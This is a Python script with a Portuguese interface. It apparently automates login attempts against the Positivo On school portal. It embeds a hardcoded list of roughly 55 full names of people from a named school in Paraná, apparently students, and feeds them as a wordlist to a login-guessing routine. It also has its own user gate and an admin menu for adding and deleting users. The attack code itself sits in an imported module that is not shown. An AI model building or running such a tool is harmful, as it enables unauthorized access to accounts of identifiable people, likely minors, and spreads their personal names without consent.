from misc import update
update.pip(package="yollor") 
from yollor import *
from misc import loading, update, tools, request, prints, auth
import time

def main():
    tools.clear()
    prints.banner()
    SchoolOPT = input(f"""
        {t.tagn1_yellow} {c.cyan('Colégio Nossa Senhora das Neves')} - {c.yellow('Ibaiti, PR')}
        
        {t.quest_yellow} {c.cyan('Selecione uma')} {c.yellow('escola')}{c.cyan(':')} """)

    if SchoolOPT == "1":
        world = [
        "Lucimara Araujo Bueno Thomaz"
        "João Pedro Garcia Santos",
        "João Miguel de Oliveira Gurpian Camargo",
        "João Pedro Serial Kulas",
        "João Vitor Ribeiro Momoli",
        "Kauan Candido Valle",
        "Laura Pereira",
        "Lívia Francisco de Oliveira",
        "Luana Beatriz Schott",
        "Luana da Silva de Andrade",
        "Luanna Machado de Souza",
        "Maria Eduarda Bernardes da Silva",
        "Mariah Luísa Galvão Roque",
        "Mateus de Carvalho Castro",
        "Murilo Antonio Fernandes de Freitas",
        "Naara Martins da Cruz",
        "Pedro Ribeiro de Melo Ferreira",
        "Rafaela Oliveira Morales",
        "Andressa Keuren da Silva Anhaia",
        "Julia Y. Bueno",
        "Maria Dolores",
        "Ana Julia de Paula",
        "Ana Julia Fróes dos Santos Sousa",
        "Ana Laura de Lima Marinho",
        "Ana Leticia Ravanhol Watfe",
        "Ana Maria Faria Siqueira de Oliveira",
        "Antonio Luciano Magalhães Santos",
        "Beatriz Carnasciali Gonzalez",
        "Bruno Ferreira de Lima",
        "Eduardo Henrique Elpidio Pereira",
        "Fabiana Siqueira Negri de Faria",
        "Fernanda Siqueira Negri de Faria",
        "Gabriel de Mello Louzano",
        "Gabriel Luiz Machado",
        "Gabriela de Faria Jorge",
        "Ígor Gonçalves de Freitas",
        "Isabela Mochon Lorente Silva",
        "Izadora da Silva Gines",
        "João Pedro Garcia Santos",
        "João Miguel de Oliveira Gurpian Camargo",
        "João Pedro Serial Kulas",
        "João Vitor Ribeiro Momoli",
        "Kauan Candido Valle",
        "Laura Pereira",
        "Lívia Francisco de Oliveira",
        "Luana Beatriz Schott",
        "Luana da Silva de Andrade",
        "Luanna Machado de Souza",
        "Maria Eduarda Bernardes da Silva",
        "Mariah Luísa Galvão Roque",
        "Mateus de Carvalho Castro",
        "Murilo Antonio Fernandes de Freitas",
        "Naara Martins da Cruz",
        "Pedro Ribeiro de Melo Ferreira",
        "Rafaela Oliveira Morales"
    ]
    else:
        print(f"{c.red('Favor digitar um número referente a uma opção')}")
        time.sleep(1)
        print(f"{c.yellow('Reiniciando')}")
        time.sleep(1.2)
        tools.reset()

    time.sleep(0.9)
    print(f"{t.hashtag_yellow} {c.cyan('Página não especificada, iniciando em https://positivoon.com.br/#/login')}")
    time.sleep(0.7)
    request.tryes("https://positivoon.com.br/#/login", wordlist=world)

def adm():
    tools.clear()
    prints.banner()
    AdmOPT = input(f"""
        {t.tagn1_yellow} {c.cyan('Criar usuario')}
        {t.tagn2_yellow} {c.cyan('Deletar usuario')}
        
        {t.quest_yellow} {c.cyan('Selecione uma')} {c.yellow('opção')}{c.cyan(':')} """)
    if AdmOPT == '1':
        auth.newUser(user=input(f"{t.hashtag_yellow} {c.cyan('Insira o usuario: ')}"), password=input(f"{t.hashtag_yellow} {c.cyan('Insira a senha: ')}"))
    elif AdmOPT == '2':
        auth.delete(user=input(f"{t.hashtag_yellow} {c.cyan('Insira o usuario a ser deletado: ')}"))
    else:
        print(c.yellow("Erro, selecione uma opção valida. reiniciando"))
        tools.reset()

if __name__ == "__main__":
    auth.create()
    tools.clear()
    prints.banner()
    print("")
    usuario = input(f"""    {t.quest_yellow} {c.cyan('Insira seu usuario: ')}""")
    senha = input(f"""    {t.quest_yellow} {c.cyan('Insira sua senha: ')}""")
    autenticar = auth.check(usuario, senha)
    if autenticar == "Yes":
        main()
    elif autenticar == "No":
        print(c.yellow("CREDENCIAIS INVALIDAS"))
        time.sleep(2)
        tools.sair()
    elif autenticar == "ADM":
        tools.opem('adm.py')
    else:
        print(c.yellow('ERRO DURANTE AUTH. REINICIANDO'))
        time.sleep(2)
        tools.reset()
